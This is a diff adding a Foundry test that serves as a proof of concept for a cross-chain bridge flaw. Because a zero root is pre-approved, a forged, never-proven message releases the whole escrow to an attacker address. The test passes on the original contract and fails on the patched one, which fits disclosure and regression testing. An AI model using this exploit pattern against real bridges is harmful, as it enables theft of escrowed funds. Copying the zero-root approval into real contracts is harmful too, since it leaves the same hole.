@@ -1,0 +1,27 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL bridge, fails on the PATCHED one.
+///         A message that was never proven still releases escrow, because its
+///         stored root is bytes32(0) and that root was pre-approved.
+contract PocTest is Test {
+    Czz internal bridge;
+    address internal updater = makeAddr("updater");
+    address internal attacker = makeAddr("attacker");
+
+    function setUp() public {
+        bridge = new Czz(updater);
+        bridge.fzzFund(1000);
+    }
+
+    function test_unprovenMessageReleasesEscrow() public {
+        bytes32 forged = keccak256("forged-message");
+        assertEq(bridge.vzzRootOf(forged), bytes32(0));
+        bridge.fzzProcess(forged, attacker, 1000);
+        assertEq(bridge.vzzCredit(attacker), 1000, "unproven message was paid");
+        assertEq(bridge.vzzEscrow(), 0, "escrow released");
+    }
+}
